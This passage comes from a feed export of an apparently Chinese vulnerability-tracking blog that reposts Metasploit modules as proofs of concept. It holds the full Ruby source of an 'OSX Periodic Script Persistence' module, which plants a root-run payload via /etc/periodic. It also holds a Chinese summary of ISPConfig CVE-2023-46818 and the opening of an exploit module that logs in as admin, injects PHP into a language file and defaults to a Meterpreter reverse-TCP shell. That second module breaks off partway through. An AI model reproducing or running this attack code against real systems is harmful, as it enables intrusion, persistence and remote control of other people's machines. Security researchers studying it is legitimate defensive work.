inherited__">Msf::Exploit::Local</span><br>  <span class="hljs-title class_">Rank</span> = <span class="hljs-title class_">ExcellentRanking</span><br><br>  <span class="hljs-keyword">prepend</span> <span class="hljs-title class_">Msf</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Exploit</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Remote</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:AutoCheck</span><br>  <span class="hljs-keyword">include</span> <span class="hljs-title class_">Msf::Post::File</span><br>  <span class="hljs-keyword">include</span> <span class="hljs-title class_">Msf::Exploit::EXE</span><br>  <span class="hljs-keyword">include</span> <span class="hljs-title class_">Msf::Exploit::Local::Persistence</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">info = &#123;&#125;</span>)<br>    <span class="hljs-variable language_">super</span>(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;OSX Periodic Script Persistence&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; <span class="hljs-string">%q&#123;</span><br><span class="hljs-string">          This module will achieve persistence by writing a script to the /etc/periodic directory.</span><br><span class="hljs-string">          According to The Art of Mac Malware no such malware species persist in this manner (2024).</span><br><span class="hljs-string">          This payload requires root privileges to run.</span><br><span class="hljs-string">        &#125;</span>,<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; <span class="hljs-variable constant_">MSF_LICENSE</span>,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; <span class="hljs-string">&#x27;gardnerapp&#x27;</span>,<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://taomm.org/vol1/pdfs/CH%202%20Persistence.pdf&#x27;</span>,<br>            <span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://superuser.com/questions/391204/what-is-the-difference-between-periodic-and-cron-on-os-x/&#x27;</span><br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2012-04-01&#x27;</span>,<br>        <span class="hljs-string">&#x27;Privileged&#x27;</span> =&gt; <span class="hljs-literal">true</span>,<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [ <span class="hljs-string">&#x27;Mac OS X x64 (Native Payload)&#x27;</span>, &#123; <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_X64</span>, <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; [ <span class="hljs-string">&#x27;osx&#x27;</span> ] &#125; ],<br>          [ <span class="hljs-string">&#x27;Mac OS X x86 (Native Payload for 10.14 and earlier)&#x27;</span>, &#123; <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_X86</span>, <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; [ <span class="hljs-string">&#x27;osx&#x27;</span> ] &#125; ],<br>          [<span class="hljs-string">&#x27;Mac OS X Apple Sillicon&#x27;</span>, &#123; <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_AARCH64</span>, <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; [<span class="hljs-string">&#x27;osx&#x27;</span>] &#125;],<br>          [ <span class="hljs-string">&#x27;Python payload&#x27;</span>, &#123; <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_PYTHON</span>, <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; [ <span class="hljs-string">&#x27;python&#x27;</span> ] &#125; ],<br>          [ <span class="hljs-string">&#x27;Command payload&#x27;</span>, &#123; <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_CMD</span>, <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; [ <span class="hljs-string">&#x27;unix&#x27;</span> ] &#125; ],<br>        ],<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">4</span>,<br>        <span class="hljs-string">&#x27;SessionTypes&#x27;</span> =&gt; [ <span class="hljs-string">&#x27;shell&#x27;</span>, <span class="hljs-string">&#x27;meterpreter&#x27;</span> ],<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [<span class="hljs-variable constant_">CRASH_SAFE</span>],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [<span class="hljs-variable constant_">REPEATABLE_SESSION</span>, <span class="hljs-variable constant_">EVENT_DEPENDENT</span>],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [<span class="hljs-variable constant_">ARTIFACTS_ON_DISK</span>, <span class="hljs-variable constant_">IOC_IN_LOGS</span>]<br>        &#125;<br>      )<br>    )<br><br>    register_options([<br>      <span class="hljs-title class_">OptEnum</span>.new(<span class="hljs-string">&#x27;PERIODIC_DIR&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Periodic Directory to write script eg. /etc/periodic/daily&#x27;</span>, <span class="hljs-string">&#x27;daily&#x27;</span>, <span class="hljs-string">%w[daily weekly monthly]</span>]),<br>      <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>, [<span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;Name of script &#x27;</span>, <span class="hljs-title class_">Rex</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Text</span>.rand_text_alphanumeric(rand(<span class="hljs-number">6</span>..<span class="hljs-number">13</span>))]),<br>      <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;PAYLOAD_DIR&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Directory to write payload to&#x27;</span>, <span class="hljs-string">&#x27;/tmp/&#x27;</span>]),<br>      <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;PAYLOAD_FILENAME&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Name of the payload file.&#x27;</span>, <span class="hljs-title class_">Rex</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Text</span>.rand_text_alphanumeric(rand(<span class="hljs-number">6</span>..<span class="hljs-number">13</span>))])<br>    ])<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span><br>    periodic = <span class="hljs-string">&quot;/etc/periodic/<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;PERIODIC_DIR&#x27;</span>]&#125;</span>/&quot;</span><br><br>    <span class="hljs-keyword">if</span> writable? periodic<br>      print_good <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;periodic&#125;</span> is writable&quot;</span><br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-title class_">CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Safe</span> <span class="hljs-string">&quot;Unable to write to <span class="hljs-subst">#&#123;periodic&#125;</span>&quot;</span><br>    <span class="hljs-keyword">end</span><br><br>    <span class="hljs-title class_">CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Vulnerable</span> <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;periodic&#125;</span> is writable&quot;</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">write_payload</span>(<span class="hljs-params">payload_bin</span>)<br>    payload_dir = datastore[<span class="hljs-string">&#x27;PAYLOAD_DIR&#x27;</span>]<br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:BadConfig</span>, <span class="hljs-string">&quot;The <span class="hljs-subst">#&#123;payload_dir&#125;</span> is not writable.&quot;</span>) <span class="hljs-keyword">unless</span> writable? payload_dir<br><br>    payload_dir += <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-keyword">unless</span> payload_dir.ends_with? <span class="hljs-string">&#x27;/&#x27;</span><br><br>    payload_file = payload_dir + datastore[<span class="hljs-string">&#x27;PAYLOAD_FILENAME&#x27;</span>]<br><br>    <span class="hljs-keyword">if</span> upload_and_chmodx(payload_file, payload_bin)<br>      print_good <span class="hljs-string">&quot;Writing payload to <span class="hljs-subst">#&#123;payload_file&#125;</span> suceeded&quot;</span><br>    <span class="hljs-keyword">else</span><br>      fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&quot;Unable to write payload to <span class="hljs-subst">#&#123;script&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">end</span><br><br>    <span class="hljs-comment"># add payload to cleanup</span><br>    <span class="hljs-variable">@clean_up_rc</span> &lt;&lt; <span class="hljs-string">&quot;rm <span class="hljs-subst">#&#123;payload_file&#125;</span> &quot;</span><br>    payload_file<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">write_periodic_script</span>(<span class="hljs-params">payload_file</span>)<br>    periodic_dir = <span class="hljs-string">&quot;/etc/periodic/<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;PERIODIC_DIR&#x27;</span>]&#125;</span>/&quot;</span><br><br>    script = periodic_dir + datastore[<span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>]<br><br>    <span class="hljs-variable">@clean_up_rc</span> &lt;&lt; script.to_s<br><br>    <span class="hljs-keyword">if</span> upload_and_chmodx(script, payload_file.to_s)<br>      print_status <span class="hljs-string">&quot;Succesfully wrote periodic script to <span class="hljs-subst">#&#123;script&#125;</span>. This will execute <span class="hljs-subst">#&#123;payload_file&#125;</span>&quot;</span><br>    <span class="hljs-keyword">else</span><br>      fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&quot;Unable to write <span class="hljs-subst">#&#123;script&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span><br>    <span class="hljs-variable">@clean_up_rc</span> = <span class="hljs-string">&#x27;sudo &#x27;</span><br>    <span class="hljs-keyword">if</span> target[<span class="hljs-string">&#x27;Arch&#x27;</span>] == <span class="hljs-variable constant_">ARCH_PYTHON</span><br>      payload_bin = <span class="hljs-string">&quot;#!/usr/bin/env python\n&quot;</span> + payload.encoded<br>    <span class="hljs-keyword">elsif</span> target[<span class="hljs-string">&#x27;Arch&#x27;</span>] == <span class="hljs-variable constant_">ARCH_CMD</span><br>      payload_bin = <span class="hljs-string">&quot;#!/usr/bin/env bash\n&quot;</span> + payload.raw<br>    <span class="hljs-keyword">else</span><br>      payload_bin = generate_payload_exe<br>    <span class="hljs-keyword">end</span><br><br>    payload_file = write_payload payload_bin<br><br>    write_periodic_script payload_file<br><br>    puts <span class="hljs-string">&quot;Cleanup script:\n\n<span class="hljs-subst">#&#123;<span class="hljs-variable">@clean_up_rc</span>&#125;</span>&quot;</span><br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; OSX Periodic Script Persistence&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
    <category term="权限提升" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
  </entry>
  
  <entry>
    <title>ISPConfig language_editphp PHP代码注入</title>
    <link href="http://example.com/2025/06/30/github_2870389815/"/>
    <id>http://example.com/2025/06/30/github_2870389815/</id>
    <published>2025-06-30T09:15:16.402Z</published>
    <updated>2025-06-30T09:15:16.397Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> ISPConfig language_edit.php PHP代码注入</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-46818</li></ul><p><strong>漏洞类型：</strong> 代码注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> ISPConfig的language_edit.php文件存在PHP代码注入漏洞。当<code>admin_allow_langedit</code>设置启用时，认证的管理员可以通过语言编辑器界面注入任意PHP代码。该漏洞允许攻击者通过注入PHP负载到语言文件中，当文件被访问时执行。</p><p><strong>产品厂商：</strong> ISPConfig</p><p><strong>产品名称：</strong> ISPConfig</p><p><strong>影响版本：</strong> version &lt; 3.2.11p1</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/ff15b581ed084f2104610d232ec4875bdfd8ab9a/modules%2Fexploits%2Flinux%2Fhttp%2Fispconfig_lang_edit_php_code_injection.rb">https://github.com/rapid7/metasploit-framework/blob/ff15b581ed084f2104610d232ec4875bdfd8ab9a/modules%2Fexploits%2Flinux%2Fhttp%2Fispconfig_lang_edit_php_code_injection.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; <span class="hljs-title class_ inherited__">Msf::Exploit::Remote</span><br>  <span class="hljs-title class_">Rank</span> = <span class="hljs-title class_">ExcellentRanking</span><br><br>  <span class="hljs-keyword">prepend</span> <span class="hljs-title class_">Msf</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Exploit</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Remote</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:AutoCheck</span><br>  <span class="hljs-keyword">include</span> <span class="hljs-title class_">Msf::Exploit::Remote::HttpClient</span><br>  <span class="hljs-keyword">include</span> <span class="hljs-title class_">Msf::Exploit::FileDropper</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">info = &#123;&#125;</span>)<br>    <span class="hljs-variable language_">super</span>(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;ISPConfig language_edit.php PHP Code Injection&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; <span class="hljs-string">%q&#123;</span><br><span class="hljs-string">          This module exploits a PHP code injection vulnerability in ISPConfig&#x27;s</span><br><span class="hljs-string">          language_edit.php file. The vulnerability occurs when the `admin_allow_langedit`</span><br><span class="hljs-string">          setting is enabled, allowing authenticated administrators to inject arbitrary</span><br><span class="hljs-string">          PHP code through the language editor interface.</span><br><span class="hljs-string">          </span><br><span class="hljs-string">          This module will automatically check if the required `admin_allow_langedit`</span><br><span class="hljs-string">          permission is enabled, and attempt to enable it if it&#x27;s disabled (requires</span><br><span class="hljs-string">          admin credentials with system configuration access).</span><br><span class="hljs-string">          </span><br><span class="hljs-string">          The exploit works by injecting a PHP payload into a language file, which</span><br><span class="hljs-string">          is then executed when the file is accessed. The payload is base64 encoded</span><br><span class="hljs-string">          and written using PHP&#x27;s file_put_contents function.</span><br><span class="hljs-string">        &#125;</span>,<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; <span class="hljs-variable constant_">MSF_LICENSE</span>,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<br>          <span class="hljs-string">&#x27;syfi&#x27;</span>, <span class="hljs-comment"># Discovery and PoC</span><br>          <span class="hljs-string">&#x27;Egidio Romano&#x27;</span><br>        ],<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2023-46818&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://github.com/SyFi/CVE-2023-46818&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://karmainsecurity.com/KIS-2023-13&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://karmainsecurity.com/pocs/CVE-2023-46818.php&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;php&#x27;</span>,<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_PHP</span>,<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;Automatic PHP&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;php&#x27;</span>,<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_PHP</span><br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;Privileged&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2023-10-24&#x27;</span>,<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;DefaultOptions&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;PAYLOAD&#x27;</span> =&gt; <span class="hljs-string">&#x27;php/meterpreter/reverse_tcp&#x27;</span><br>        &#125;,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [<span class="hljs-variable constant_">CRASH_SAFE</span>],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [<span class="hljs-variable constant_">REPEATABLE_SESSION</span>],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [<span class="hljs-variable constant_">IOC_IN_LOGS</span>]<br>        &#125;<br>      )<br>    )<br><br>    register_options([<br>      <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;TARGETURI&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;The URI path to ISPConfig&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>]),<br>      <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;USERNAME&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;ISPConfig administrator username&#x27;</span>]),<br>      <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;PASSWORD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;ISPConfig administrator password&#x27;</span>])<br>    ])<br>    <br>    <span class="hljs-variable">@authenticated</span> = <span class="hljs-literal">false</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span><br>    print_status(<span class="hljs-string">&#x27;Checking if the target is ISPConfig...&#x27;</span>)<br>    <br>    <span class="hljs-comment"># Try to log in and parse version if credentials are provided</span><br>    <span class="hljs-keyword">if</span> datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>] &amp;&amp; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>]<br>      <span class="hljs-comment"># Clear any existing cookies before login</span><br>      cookie_jar.clear<br>      <br>      login_res = send_request_cgi!(&#123;<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>        <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login/&#x27;</span>),<br>        <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;username&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>          <span class="hljs-string">&#x27;password&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>],<br>          <span class="hljs-string">&#x27;s_mod&#x27;</span> =&gt; <span class="hljs-string">&#x27;login&#x27;</span><br>        &#125;,<br>        <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>      &#125;)<br>      <span class="hljs-keyword">if</span> login_res &amp;&amp; (login_res.headers[<span class="hljs-string">&#x27;Location&#x27;</span>]&amp;.<span class="hljs-keyword">include</span>?(<span class="hljs-string">&#x27;admin&#x27;</span>) |<span class="hljs-params"></span>| login_res.body.downcase.<span class="hljs-keyword">include</span>?(<span class="hljs-string">&#x27;dashboard&#x27;</span>))<br>        <span class="hljs-comment"># Try to access the dashboard or settings page</span><br>        settings_res = send_request_cgi(&#123;<br>          <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>          <span class="hljs-string">&#x27;uri&#x27;</span> 